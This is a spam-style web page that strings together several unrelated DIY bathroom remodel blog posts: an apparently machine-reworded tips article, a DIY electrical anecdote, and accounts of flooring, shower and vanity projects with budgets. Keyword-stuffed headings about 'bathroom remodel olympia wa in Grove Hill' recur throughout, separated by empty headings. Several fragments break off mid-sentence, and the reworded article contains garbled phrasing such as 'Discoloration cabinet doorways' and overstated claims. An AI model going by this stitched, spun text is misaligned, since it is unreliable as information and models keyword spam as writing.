   <div>   <div>     <p>Despite the fact that just about everyone has seen great bathroom remodel, affordable remodeling of the bathroom appears to become a mystery for many home owners. This document discloses easy steps that any homeowner with no expertise may take to redesign his/her bathroom. Just like any remodeling/restoration project you will see some small task that needs to be left towards the professionals however, this document highlights nearly all work that may be accomplished by homeowner.</p>   <h2>Getting the most out of bathroom remodel olympia wa in Grove Hill</h2>   <h2></h2>   <p></p>    <p>1) Unlike the most popular belief, probably the most costly facet of bathroom remodel isn&#x2019;t the alternative from the bathroom vanity or even the counter-top. It&#x2019;s not the brand new flooring or even the alternative of the toilet. Actually, probably the most costly facet of bathroom remodeling reported by home owners is the price of changing ceramic tiles on bathroom walls and shower walls. This could easily cost on the 1000 dollar including material and labor. Yet, an excellent bathroom wall is a valuable part associated with a modern bathroom which can&#x2019;t be overlooked. The good thing is that the great searching bathroom wall doesn&#x2019;t have to cost 1000&#x2019;s also it can be set up in couple of minutes by homeowner with limited or no expertise. The reply is bathroom tile boards. Tile boards are ceramic lookalike that feel and look amazingly real once installed and price a small fraction of what you will purchase ceramic tiles. Tile boards generally are available in 4 feet by 8 feet sections. Tile boards may be easily cut utilizing a circular saw and you may use adhesive to connect it for your wall. 2) Another affordable bathroom remodel would be to reface and stain your overall bathroom cabinet doorways. For those who have bathroom cabinets beneath your sink, instead of changing the whole unit that won&#x2019;t only need installation but additionally plumbing work, you are able to switch the cabinet doorways. Changing cabinet doorways are quick and simple. You may also stain the whole cabinets when you changed the doorways to ensure they are look new and shinny. Discoloration cabinet doorways will also be simple and could be done fairly rapidly.</p>   <h2>Top ideas for bathroom remodel olympia wa in Grove Hill</h2>   <h2></h2>   <p></p>     <p>3) If you&#x2019;re not planning to modify your bathroom remodel vanity counter, make sure to switch the bathroom taps. Bathroom taps can also add attract the general picture of your bathroom and you do not have to become a plumber to exchange the bathroom taps. You&#x2019;ll find elegant bathroom taps at reasonable price should you look around. Make sure to also use the internet.</p>   <h2>Talking about bathroom remodel olympia wa in Grove Hill</h2>   <h2></h2>   <p></p>    <p>4) For those who have a classic tub, try refinishing bathroom remodel instead of changing it. With this part I recommend that you simply employ a professional to refinish or glaze your tub. I dont recommend doing the work yourself like a small imperfection can ruin all of your hard effort.</p>    <p>5) Wall hangings along with other adornments will prove to add much to the good thing about your bathroom remodel and you do not have to employ an expert to get it done either. A sizable mirror greatly improves the feel of your bathroom. Furthermore, you are able to hang a couple of small decorative objects quietly wall or maybe there&#x2019;s room around the counter.</p>    <p>6) Changing bathroom remodel add-ons for example towel wardrobe hangers and cup holders are pretty straight forward, simple and easy , affordable. All of them lead towards the overall picture of your bathroom.</p>    <p>7) Finally, an excellent fresh paint job will complete your bathroom remodel and brings about the face area of the new bathroom. Fresh paint job is straightforward and could be made by anybody. The key part is to find the right color that suits well using the colour of your cabinets and walls. If you&#x2019;re unsure by what color to make use of, look into the popular remodeling magazines.</p>   </div>  </div>

   <div>   <p>For this part of the Bathroom Remodel project, there is not a before and after picture. Your lights either turn on or they don&#x2019;t.</p>  <h2>Top ideas for bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p>I was able to make it through quite a few tasks prior to this part without much help, but electrical work is a whole different ballgame.&#xa0; One quick touch of the wrong wires and you look like this&#x2026;.or worse.</p>  <h2>Talking about bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p>At one point during this electrical adventure, my friend and I got close to the shock of a lifetime from accidentally touching a copper ground wire to the main set&#xa0; wires that go into the breaker box.&#xa0; Let me tell you, we had to have a beer after that encounter&#x2026;and kind of sort of didn&#x2019;t tell my wife.</p>  <h2>bathroom remodel olympia wa in Grove Hill - A word of advice</h2>  <h2></h2>  <p></p>   <p>For this part, I enlisted the help of a good friend of mine Chris.&#xa0; Chris has been remodeling his entire house which means that he&#x2019;s skilled in the art of electrical work.&#xa0; Even with his knowledge from renovating his whole house we still had to use the all-knowing Google.&#xa0; We joked around that this was the bathroom that Google built.&#xa0; I literally watched some kind of video for every step I took during the Bathroom Remodel. For this project, we needed electrical diagrams images from Mr.Google to tell us to connect the white wire to the other white wire. Thanks Google!</p>   <p>I&#x2019;m going to admit it, Chris did most of the work during this part of the project.&#xa0; I was there to hand him tools and be the &#x201c;that looks right&#x201d; guy.</p>   <p>In these pictures we are getting the electrical current from the breaker box into an overhead outlet box.</p>   <p>This was where google came to the rescue.&#xa0; We had run out of length on one of the wires so we had to figure out a different way to hook up a three-way switch, which for those of you that don&#x2019;t know what that is, it allows two electrical switches to change the same light.</p>   <p>The last part of the electrical project was to get the new recessed light into the landing at the bottom of the stairs.&#xa0; Again, with Chris doing most of the work, he got everything working like a charm.&#xa0; The only part I did by myself was to cut the hole into the ceiling.&#xa0; If you look closely at the picture below you will notice that there&#x2019;s 1 and half holes in the ceiling.&#xa0; I have one job and I can&#x2019;t even get that right. haha!!</p>   <p>I want to give a big shout out to Chris for his help on this one.&#xa0; He probably saved me about&#xa0; $500 because we didn&#x2019;t have to hire and electrician. I just paid him in beer and wings.</p>   <p>&#xa0; The house hasn&#x2019;t burnt down and all the lights turn on; the sign of a job well done in the electrical world!</p>   <p>Have you ever had your own &#x201c;SHOCKING&#x201d; experience?</p>   <div>    <p>Related posts:</p>   </div>  </div>

This enclosure was ancient but the wood was still in great shape. I didn&#x2019;t want to keep it white though and thought a barnwood finish would look better. I cut up the wood into pieces and then sanded it down really well. I then sanded it using an equal part mixture of Minwax Dark Walnut Stain and Rustoleum Weathered Gray. I love this mix of stain, it is a great color. I applied one coat to the wood and then let it dry overnight. Once dry, I sanded the edges again, using a sanding block, to give it a distressed look. I gave the wood one coat of gloss poly to seal it and protect it from scratches and little hands hanging their towels up.   </div>   <div>    For the towel rack, I purchased 4 hooks from Lowes and then screwed them in, measuring every 8 inches. We screwed the entire piece then into the studs to help secure it to the wall.   </div>   <div>    For the bath sign, I purchased the wood look letters from Michael&#x2019;s in their dollar bin section. I didn&#x2019;t do anything to the letters, they came with that stained, wood look. Using wood glue, I glued the letters on to the stained wood piece. To hang, I nailed in a picture hanger to the back and then hung it on a screw on the wall.   </div>   <div>    Both pieces were very easy and if you don&#x2019;t have old wood laying around, brand new wood would look great, too. I would just sand it even more to give it an older, distressed look.   </div>   <p><span>Now here are the details of the bathroom!</span></p>   <p>Wall Color: Smoke by Benjamin Moore, Color Matched to Sherwin William&#x2019;s HGTV Paint in a Satin Finish.

I have wallpapered with maps and found it to be so so satisfying -it goes very quickly. My words of advice are to draw a true vertical reference line for your first sheet &#x2013; use a long level or a plumb line with chalk and buy like a full box of razors. A sharp blade will be everything when you trim at the ceiling or around things. If it&#x2019;s not sharp enough, the paper tears instead of cuts. Good luck, I know it sounds intimidating but really it&#x2019;s easy peasy. Can&#x2019;t wait to see it done.</p>      </article>      <ul>       <li>        <article>         <div>          <small>October 10, 2014 at 10:16 am (2 years ago)</small>         </div>         <p>Thanks for the tips, Caitlin!

   <div>   <p>It was a long weekend, and I&#x2019;ve enjoyed relaxing a bit more this week! We worked hard on ourt. I&#x2019;m excited about the changes taking place in this room!</p>  <h2>bathroom remodel olympia wa in Grove Hill - A word of advice</h2>  <h2></h2>  <p></p>   <p>Our demolition portion went mostly as planned. Except we took a slight detour.&#xa0;</p>  <h2>Top ideas for bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <h2>Move the Wall?</h2>   <p>We realized that if we moved the wall separating out bathroom and utility room just 26 inches, we&#x2019;d be able to turn out bathtub and gain serious space in the bathroom.&#xa0;</p>  <h2>Talking about bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p>We&#x2019;d even be able to move the washer and dryer in there, like we&#x2019;ve talked about doing many times before.</p>   <p>We thought it&#x2019;d be the perfect time to move the wall. After all, the bathroom was currently being remodeled.&#xa0;</p>   <p>But, after we took down the sheetrock in the bathroom, we realized that there was no way we could stay on budget and on track time wise if we added that work. So, we decided just to put the bathtub back where it was.&#xa0;</p>   <p>At first I was disappointed. Moving the wall really seemed like a great solution.&#xa0;</p>   <p>But, looking back now I&#x2019;m glad we didn&#x2019;t do it. Moving another wall and having to clean out the utility room would have taxed our available energy. We would have slowed WAY down.&#xa0;</p>   <h2>Back to the Bathroom Remodel</h2>   <p>Once we decided not to move the wall, we jumped back into the current project full-steam ahead.&#xa0;</p>   <p>We couldn&#x2019;t remove the tub from the room, as it wouldn&#x2019;t fit through the door. We originally brought it in when the wall was torn down.</p>   <p>That meant we had to lay our linoleum on one half of the room first. Once we glued that side down and rolled it smooth, my step-dad helped Bryan lift the tub over the roll of flooring and onto the finished side.</p>   <p>Then, Bryan continued the flooring process.&#xa0;</p>   <p>We were able to:</p>   <ul>    <li>Replace the floor board with dry rot</li>    <li>Place the new flooring</li>    <li>Replumb the toilet, sink, and tub</li>    <li>Install a Splash Guard on one side of the tub</li>   </ul>   <p>We still need to:</p>   <ul>    <li>Sheetrock</li>    <li>Sand/Tape</li>    <li>Paint</li>   </ul>   <p>We are making a trip to town for the sheetrock tomorrow night. We were planning on buying locally, but the green board (water resistant) is more than double the cost per sheet if we buy it here. That price makes the gas money worthwhile to take a trip to Spokane.&#xa0;</p>   <p>Bryan is hoping to get all the rock up on Friday night and give it a coat of mud.&#xa0;</p>   <p>Then, he can sand and remud on Saturady.&#xa0;</p>   <p>If all goes well, it&#x2019;ll be ready for painting early next week. We&#x2019;re going with purple again.&#xa0;</p>   <p>We&#x2019;re also talking about installing a vinyl wainscoting around the lower half of the room to add further water protection.&#xa0; We don&#x2019;t want to have to do another bathroom remodel anytime soon. </p>   <h2>How&#x2019;s the Budget Shaping Up?</h2>   <p>Our goal was to keep remodeling expenses under $1000. We&#x2019;ve currently spent $700, and should stay under budget even after buying sheetrock, mud, tape, paint, and wainscoting. </p>   <p>We were able to find a remnant of linoleum that fit the bathroom for only $86. That gave us some serious savings. </p>   <p>Because of that, we were able to invest in a new sink. We were planning on reusing the old one, but we opted to buy a larger one. It provides essential storage, and will allow us to get rid of some ugly plastic storage. I&#x2019;m excited! </p>   <p>Here&#x2019;s a pic of my husband installing our pretty new sink: Otherwise, our expenses were: </p>   <ul>    <li>Lumber for the floor and wall by the shower we had to replace</li>    <li>New tub plumbing since the old ones were broken</li>    <li>All the piping and connections needed</li>    <li>Flooring</li>    <li>Wax seal for the toilet</li>    <li>Glue for the flooring</li>    <li>Nails and screws</li>    <li>A drill bit</li>    <li>Splash guard for the tub</li>    <li>Caulking. Lots and lots of caulking.</li>   </ul>   <p>And probably some other things I can&#x2019;t think of. The small things really add up in a bathroom remodel! </p>   <p>It&#x2019;s looking good though&#x2013;I&#x2019;m excited to see it finished this weekend! And thankfully, we were only without a working toilet for a couple of hours. </p>   <p>What do you think of our flooring? I like it!</p>   <p>Are you tackling any home improvement projects? I&#x2019;d love to hear about it! </p>   <div>    <h3><em>Related</em></h3>   </div>  </div>

   <div>   <h2>A Bathroom Remodeling Project and What to Consider</h2>   <div>    <h2><font>Before You Plan Your Bathroom Remodeling Project</font></h2>    <p>When you get right down to it, remodeling your home or any part of it will take a great deal of thought. There will be many choices that have to made when you draw out a plan of how you want your remodeling project to turn out. In this article, we will discuss the many ways that a bathroom remodel can be done and what you may want to consider.</p>   <h2>Talking about bathroom remodel olympia wa in Grove Hill</h2>   <h2></h2>   <p></p>    <p>To begin with, before you start a project like this, you may want to get an accurrate assessment of the job to find out if there may be any hidden damages from potential leaks that may have happened due to breakdown of caulk, grout or other areas that aren&#x2019;t sealed properly. Hidden damages can cause you to go over your budget. For instance, if you need to have mold removed or a wall rebuilt.</p>   <h2>bathroom remodel olympia wa in Grove Hill - A word of advice</h2>   <h2></h2>   <p></p>    <p>If it doesn&#x2019;t look like there are any underlying damages that may be present, at least add some money to your budget just in case. In my years of experience in construction, I have been involved in many projects that look innocent on the outside, but have issues on the inside.</p>   <h2>Getting the most out of bathroom remodel olympia wa in Grove Hill</h2>   <h2></h2>   <p></p>    <p>A bathroom remodel will usually add more value to your home provided that you don&#x2019;t over do it. It is going to depend on whether or not you plan on selling your home in the near future or you plan on living there for quite some time. This is one of those decisions that you need to make before you redesign your bathroom.</p>    <h3>Putting in a Jacuzzi</h3>    <p>Installing a Jacuzzi as part of your bathroom remodeling project has a lot of benefits such as, giving you a place to relax and relieve your stress or it will be a plus to any potential homebuyers if you are selling your home. There are things to consider if you are going to go this route.</p>    <p>Your bathroom may not be able to accommodate the room needed for a Jacuzzi to fit, therefore you will have to expand the bathroom. Keep in mind that this may not be cost effective if you are selling your home. You may be able to cut costs in other areas and deal with them later. If you are doing a complete remodel, now would be the time to add one. Along with adding a Jacuzzi, you may want to think about what type of flooring material you are going to choose. You can find nice flooring material that won&#x2019;t break your budget.</p>    <h3>Other Bathroom Ideas To Consider</h3>    <p>If you can&#x2019;t afford to install a Jacuzzi, there are more cost effective ways to do a bathroom remodel that will please you and your family or potential homebuyers. You may have a corner in your bathroom where you can add a neo-angle shower enclosure or a nice in-line heavy glass shower/tub enclosure. There are a wide variety of styles, finishes and hardware to choose from.</p>    <p>Most of the time your remodeling project will involve putting in a new bathroom vanity, but why stop there? Add a few more bathroom cabinets to give you additional storage space that is usually lacking. It will add convenience and luxury to the room and not to mention that it will help enhance your decor.</p>    <p>Other items that come into play would be replacing the toilet or an entertainment system. The entertainment system doesn&#x2019;t have to be anything fancy. You can add a stereo system and/or a small TV for those times when you are relaxing in the Jacuzzi.</p>    <p>These are just some ideas that you may want to think about when it comes to a bathroom remodel.

   <div>   <p>So it has been a long road for this bathroom remodel and definitely has taken us longer than I expected, but we are done!! We faced a lot of challenges&#x2026;old wooden walls, crooked floors, crooked walls, but all in all, I think it looks fantastic! I am so proud that we did so much of the work ourselves. With the help of my Dad, we were able to do everything but the plumbing and the electrical.</p>  <h2>bathroom remodel olympia wa in Grove Hill - A word of advice</h2>  <h2></h2>  <p></p>   <div>    We DIYed so much because not only would it give us the opportunity to learn a lot, but also to save money. I absolutely hate paying someone to do something that we could learn to do. We ended up basically gutting the bathroom and were still able to stay around our budget.   </div>   <div>    I think breaking this down will be the easiest way to tell you exactly what we did.   </div>   <div>    Plumbing:   </div>   <div>    Jackhammered up floor to install new plumbing to add a sink and toilet   </div>   <div>    Moved shower 12 inches and installed new shower   </div>   <div>    Installed toilet   </div>   <div>    Installed vanity   </div>   <div>    Structural:   </div>   <div>    Removed two old wooden walls   </div>   <div>    Studded, dry walled and mudded new walls and the shower surround   </div>   <div>    Patched tons of damage caused by moving the shower-holes in ceiling and walls   </div>   <div>    Drywalled over old door   </div>   <div>    Created a new entrance from the playroom   </div>   <div>    Electrical:   </div>   <div>    Removed old outlet   </div>   <div>    Added new outlet to control new fixtures   </div>   <div>    Added new fan that has a light, heat, and ventilation   </div>   <div>    Added two recessed lights   </div>   <div>    Misc.:   </div>   <div>    Laid new flooring   </div>   <div>    Painted walls and ceiling with a waterproof sealer and then painted   </div>   <div>    Added trim and shoe molding around the floor   </div>   <div>    Installed a new door   </div>   <div>    Overall, the hardest part was mudding the walls. Who knew that it would be so difficult! We spent DAYS trying to get this absolutely perfect, and that perfection never happened.   </div>   <div>    So here are the before and afters   </div>   <div>    The toilet used to be in the laundry room   </div>   <div>    We thought this awkward nook would be perfect for the toilet   </div>   <div>    Here&#x2019;s what it looks like now!   </div>   <div>    <table>     <tbody>      <tr>       <td>This is the only spot unfinished in the bathroom. I want to build shelves on this wall like I did in my bedroom.</td>      </tr>     </tbody>    </table>   </div>   <div>    The shower was seriously bad. It was made of cement and weird plasticy walls and had seen better days.   </div>   <div>    And now I love it! Big, spacious, bright white, and clean!   </div>   <div>    There was no sink before. You had to wash your hands in the laundry tub.   </div>   <div>    The vanity we decided to use was my parents and they were throwing it away. I painted it and changed the hardware and it looks brand new now! Before:    <table>     <tbody>      <tr>       <td>The drawers had a bit of catastrophe on the way to our house and were being repaired, that&#x2019;s why they are not pictured.</td>      </tr>     </tbody>    </table>    <p>After:</p>   <h2>Talking about bathroom remodel olympia wa in Grove Hill</h2>   <h2></h2>   <p></p>   </div>   <div>    The entrance to the bathroom used to be through the laundry room, which wasn&#x2019;t a layout that we loved. This picture is if you were standing in the bathroom looking into the laundry room.   </div>   <div>    This area has been closed up and now the entrance comes from the family room/playroom.   </div>   <table>    <tbody>     <tr>      <td>Oops, forgot to paint the back of this door.</td>     </tr>    </tbody>   </table>   <div>    This corner was a mishmash of toy storage and our hamper.   </div>   <table>    <tbody>     <tr>      <td>This picture really captures just how bad the lighting was in here before. It is blinding on those walls! The new recessed lights make SUCH a difference!</td>     </tr>    </tbody>   </table>   <div>    Now it looks much better and this ladder shelf provides some additional storage.   </div>   <div>    Here are a few more shots   </div>   <div>    <div>     <p>We are so happy with how it turned out! I just need to build those shelves and paint the back of the door and then I can call this project OFFICIALLY done!

   <div>   <p><span>The second big project we took on was the renovation of the master bathroom. &#xa0;The problem with the bathroom was that there were two vanities and no bathtub. A wall with a door separating the vanity space and the shower/toilet darkened the area, so light was only getting through a small window. Half of the bathroom had carpet in it (YUCK) and the other hand had yellowed tile.<span>&#xa0; </span>The lack of door to the master bedroom concerned me because of privacy issues, plus the no bath was almost a deal breaker for me.</span></p>  <h2>Where to find more information on bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p><span>We decided to put a soaking tub and separate shower, plus replace the double vanity. &#xa0;The permits were pulled and then the space was gutted all the way down to the studs. </span></p>  <h2>Getting the most out of bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p><span>&#xa0; </span></p>  <h2>Top ideas for bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p><span>Once the room was torn up&#xa0;we were left with a shell in which we could execute the new master bathroom design. The bathroom tub and shower were framed out as well as the pony wall between the shower and bath. Originally we designed two point walls<span>&#xa0; </span>but we ended up pulling one down. The wall closed up the area and it was early enough in the process that we could remove it.</span></p>   <p><span>The color palette for this space was white and gray accents (surprise, surprise) but we wanted to have a fresh relaxing feel every time we walked in. &#xa0;I&#x2019;ll be back with our choices for materials but suffice it to say, the room was this torn up for about three weeks! &#xa0;Issues came up in the kitchen so we had to halt work on the bathrooms which set back our timeline. &#xa0;What what renovation actually happens on time right??</span></p>    <div>    <div>     Sharing is Caring!     <span>0</span>     <span>0</span>     <span>0</span>     <span>0</span>    </div>   </div>   <div>    <h3><em>Related</em></h3>   </div>   </div>

   <div>     <p>Our master bathroom had been added on in the 90&#x2019;s, so it wasn&#x2019;t quite as outdated as our hall bath, but it still came equipped with an awkward layout and a brass fiberglass shower. One of our major goals in this remodel was to make the shower larger. The fiberglass drop in shower was small and did not use all the space in the back corner. Because the corner was oddly shaped we couldn&#x2019;t&#xa0; just buy a new larger drop in, instead we had to build a custom shower stall from scratch.</p>  <h2>Talking about bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p>As for the design itself, we wanted a classic black and white color scheme with vintage charm. We knew we wanted white subway tile and a glass mosaic accent&#xa0; tile as well as black cabinets. We also wanted updated brush nickle hardware and a frame-less glass shower door. Here is the original project board I designed.</p>  <h2>Getting the most out of bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p>Oh and did I mention we wanted to do all of this on a small budget? In the end we spent $3200 on this remodel. See below for&#xa0; a breakdown of the budget.</p>  <h2>bathroom remodel olympia wa in Grove Hill - A word of advice</h2>  <h2></h2>  <p></p>   <p>Here are some pictures of the progress. The shower stall took the majority of the work. I think it took us about a month to finish it. First we ripped out the old shower then framed out the new stall walls.&#xa0; Up went the cement backer board, then we prepped the floor for the new custom shower pan.</p>   <p>Here&#x2019;s the new shower pan with the concrete poured.</p>   <p>And with the new custom marble tiled floor.</p>   <p>This gives you an idea of what the whole project entailed. We didn&#x2019;t have a bathroom for about 2 months.</p>   <p>And the reveal!</p>   <p>The wall color is amazing! It&#x2019;s Olympic Sweet Illusion. It looked white on the chip but is undeniably blue on the wall. I wanted something soft to juxtaposition all the black and white and this color is truly ethereal.</p>   <p>The frameless glass door almost didn&#x2019;t happen. They were so much more expensive than we had imagined (think $700), then luckily we found this one on for $429. It&#x2019;s a . I was a little skeptical at first about the quality, but it wound up being even nicer than most of the $700 ones we had looked at. The only caveat was that we couldn&#x2019;t get a brush nickle handle, but for an almost $300 savings who care?</p>    <p>The only real argument we got in over this bathroom was the tile. I was all set to put in a classic black and white floor (which is also very budget conscious) when Cody vetoed the idea. For a while we couldn&#x2019;t decide at all what to do until we saw this at the . Its Hampton Carrara Polished 4 x 12 (13.99 sq ft). We loved that it looked like over-sized subway tile. The shower floor in surrounded by (6.99 sq ft) These tiles almost blew our budget.</p>   <p>Because the floors were so expensive we decided to save money on the walls and go with subway tile. Cody was originally against this idea because of how much work subway tile is, but in the end the budget won. The s (4.82 sq ft) and the glass accent tile (9.98 sq ft) are both from Lowe&#x2019;s. We also updated all the fixtures with brushed nickle, also all from Lowe&#x2019;s.</p>   <p>Here&#x2019;s a close-up of the accent tile. We knew we wanted glass tile and this one won us over with its subtle blues and marbles mixed in.</p>   <p>We saved a lot of money by keeping the original tub and cabinets which were in great shape. We gave them a new black finish with acrylic black paint and added new hardware. The vanity got a new cultured white marble top as well as a new faucet.</p>   <p>And I do love a good before and after&#x2026;..</p>   <p><strong>Budget Breakdown</strong></p>   <p>Building Materials:&#xa0; 469.03</p>   <p>Tile: 1587.16</p>   <p>Lighting: 84.97</p>   <p>Paint: 44.72</p>   <p>Faucets: 377.94</p>   <p>Vanity top: 138.00</p>   <p>Mirror: 69.99</p>   <p>Shower door: 428.56</p>   <p><strong>Grand Total: 3200.37</strong></p>   <p>Linked up with:</p>   </div>

   <div>   <p>The master bathroom remodel is continuing along here at the Big Day Coming house. The going was pretty slow when we got past and had to , frame out the new layout and get the drywall up.</p>  <h2>bathroom remodel olympia wa in Grove Hill - A word of advice</h2>  <h2></h2>  <p></p>   <p>But, over the last couple weeks we&#x2019;ve managed to put down plywood to replace the sections we tore up to , laid down cement board, put up drywall, done the electrical and tiled the floor. This past week we finally got the tile grouted and sealed and put the new toilet and vanity in.&#xa0;Thankfully the project started coming together much quicker once the plumbing and venting was done. I haven&#x2019;t tackled a project that involved so much work in terms of re-plumbing and knocking down walls before, so the pace was a bit slow.</p>  <h2>Getting the most out of bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p>The project&#x2019;s next major hurdle is doing the shower, which will be on hold for the next five weeks while my father is down in Florida escaping the snow. So in the meantime I&#x2019;ll be putting on base molding, replacing an outlet, putting up some of the fixtures like the toilet paper dispenser, mirror, towel bars, and robe hooks. And, the grunt work will be to see if I can scrape off the ceiling stippling so we don&#x2019;t need to replace all the ceiling drywall (or try to poorly match the pattern on the new section we put up where the shower used to be).</p>  <h2>Talking about bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p>All in all, my wife and I are really happy with the way this is turning out.

   <div>   <p>Today I would like to share the renovations my parents (Annie&#x2019;s parents) have made to their &#x201c;new&#x201d; place. &#xa0;I say &#x201c;new&#x201d; because it was actually my sister and her family&#x2019;s house until fall of 2012 when they switched houses. My youngest sis and her family moved into my parent&#x2019;s (they bought and did the entire legit change of course) country house in my hometown in Indiana and my parents and other sister moved a town over (where we went to middle and high school), began a new chapter in their lives and performed a makeover on the space. A big one.</p>  <h2>bathroom remodel olympia wa in Grove Hill - A word of advice</h2>  <h2></h2>  <p></p>   <p>They too went from country to town living and understand what Greg and I have experienced. &#xa0; It truly is a change in itself not to mention undergoing renovations from the start. We&#x2019;ve been doing the DIY house reno thing together though&#x2026;although theirs was at a much faster pace than ours. It was nice being able to talk about the same things and mishaps/successes 600 miles apart.</p>  <h2>Talking about bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p><em>2009</em></p>  <h2>Where to find more information on bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p>There were some mishaps, delays and the usual issues with a remodel (questioning the paint color and living in a hectic situation). &#xa0;The cabinet dropped on on my mom&#x2019;s big toe and I won&#x2019;t share the picture but ouch and dad had some boo boos too.</p>   <p>Unfortunately, there aren&#x2019;t really much in terms of before pics. I&#x2019;ll try to explain what it used to look like though.</p>   <p>It&#x2019;s an amazing transformation and they continue to work on the house, making vast improvements. A mudroom is in their future.</p>   <p>Great job, mom and dad! Mom would say mostly dad but she has great taste and always makes things look a million times better. It&#x2019;s in our blood. &#xa0;Us Emley gals (my maiden name) are down with the decorating/crafty gene. &#xa0; &#xa0;Dad is like Greg (or rather Greg is like dad since he&#x2019;s younger) and they are very handy and get beautiful results. You&#x2019;ll see in these pictures&#x2026;</p>   <p>By the way we have not seen the house in person so I&#x2019;m explaining as best I can from memory and talking with my parents. &#xa0;I still can&#x2019;t get over how different and wonderful it looks. &#xa0;Huge improvement!</p>   <p>So we begin in the bathroom&#x2026;</p>   <p>It was small, people, and lacking storage and really a sense of style. It just kind of existed and did the basic functions. &#xa0;No offense to my sister who tried to add a touch of something. She did have 2 great kids who started their lives in this house and did a fabulous job on their rooms and touches of her own on the rest of the house.</p>   <p>New&#xa0;storage&#xa0;cabinet (and the room was brown).</p>   <p>The wall was removed that had a second entry door from the laundry room which was open to the kitchen. &#xa0;This new layout really opened up the space.</p>   <p>The bathroom and kitchen share a wall which is the one the toilet and cabinet are against. &#xa0;This is when the new doorway and wall were built (the back and side of the cabinet).</p>   <p>See, shared wall for plumbing (the house is on a slab) between the bathroom and kitchen. &#xa0;How adorable is my dad? &#xa0;I&#x2019;m going to mention they also got one of those new tankless water heaters and my dad is in heaven. &#xa0;Hot water whenever you want and it doesn&#x2019;t run out unlike their old place. &#xa0;(Growing up, the 3 of us girls and my parents had tifts over the bathroom and I&#xa0;remember&#xa0;some of us had to wait til we had hot water again&#x2026;often that was dad if I&#xa0;remember&#xa0;correctly.) We&#x2019;re considering getting one.</p>   <p>New shower, sink, hardware, fixtures, beadboard, doors, paint and more.</p>   <p>Down the reno road&#x2026;</p>   <p>Door hanging fun.</p>   <p>New flooring added.</p>   <p>The cabinets were re-used and placed in the laundry area. &#xa0;Forgive me but I couldn&#x2019;t find &#xa0;a full picture of the finished room but you can see the big change and how beautiful it now is.</p>   <p>But that&#x2019;s not all&#x2026;they went to the kitchen next. &#xa0;Which needed help. &#xa0;A lot of help. &#xa0;The layout was not decent and while it was rather large, it didn&#x2019;t have much storage or flow. &#xa0;My parents set out to fix all of this, living with all that randomness of temporary shelving and not having a stove for a bit.</p>   <p>And there was this thing. &#xa0;Some divider that served no purpose whatsoever. &#xa0;I know, let&#x2019;s block the kitchen from the kitchen. &#xa0;Random. &#xa0;The refrigerator used to be on the right side and my sis had a pantry cabinet (had to have it with the lack of cabinet space) with the microwave in it. &#xa0;Since it&#x2019;s an eat-in kitchen, it was even harder to move around in and not really&#xa0;accommodating&#xa0;for an island with the old arrangement which would have helped with the lacking counterspace.</p>   <p>My magnet for ! &#xa0;Shameless plug? I think not. &#xa0;Supportive parents.</p>   <p>Same space. &#xa0;Wall shared with the living room.</p>   <p>Earlier in both renos (these are not in order).</p>   <p>The door to the garage was removed and a new one was made on the left. &#xa0;Much better.</p>   <p>Great vacuum by the way. &#xa0;We have one too. &#xa0;Craigslist score for like $60 but only after we really liked my parent&#x2019;s Dyson and kept an eye out.</p>   <p>Oh the joy of living through a reno!</p>   <p>Sneakity peek into the living room from the kitchen entry.</p>   <p>That is the door to the garage and new beadboard on the wall. &#xa0;I know, right? &#xa0;What a difference! (And new appliances.)</p>   <p>Forgot to show you the new door to the bathroom. &#xa0;So, there are 2 entries to the bathroom. &#xa0;The one in the hall that leads to the 3 bedrooms and this one in the kitchen.</p>   <p>Ready?</p>   <p>Waiting for the countertop. &#xa0;Hickory cabinetry and that is a greenish yellow shade on the wall that mom questioned but I think goes well with the overall look. &#xa0;Lovely. &#xa0;And talk about storage and flow. &#xa0;Mom loves it.</p>   <p>Before the new flooring went in. &#xa0;And there is no sink on the right-it was just moved there temporarily. &#xa0;That&#x2019;s where the large window overlooking the backyard and dining set is.</p>   <p>Dressed for Christmas with&#xa0;the&#xa0;village and with countertops.</p>   <p>The dining set was a thrifty furniture store score cause that&#x2019;s how our family rolls. &#xa0;Boom!</p>   <p>I spy the new flooring boxes.</p>   <p>Then ta-da, flooring added. &#xa0;Lucky, our family cat, and a box with a craft project atop it. &#xa0;We&#x2019;re crafty, DIY kind of people that love animals. &#xa0;Lucky was a stray that my mom found on the road by our house. &#xa0;He&#x2019;s an ornery sweetheart. &#xa0;I bet Sophie, our other&#xa0;family&#xa0;cat, was nearby. &#xa0;Another rescue darling.</p>   <p>Now they have moved on to the mudroom (which they are creating), garage and I believe they worked on the attic entry in the garage. &#xa0;The backyard will be addressed sometime as well (you can see the storage shed back there). &#xa0;To be continued&#x2026;</p>   <p>For more insight into their place, here&#x2019;s the living room. &#xa0;Cute, cozy and comfortable. &#xa0;Can&#x2019;t wait to visit and see what my sis has been up to at the &#x201c;old&#x201d; homestead.</p>   <p>&#xa0;</p>   <p>&#xa0;</p>   <div>    <h3>Related posts:</h3>   </div>  </div>

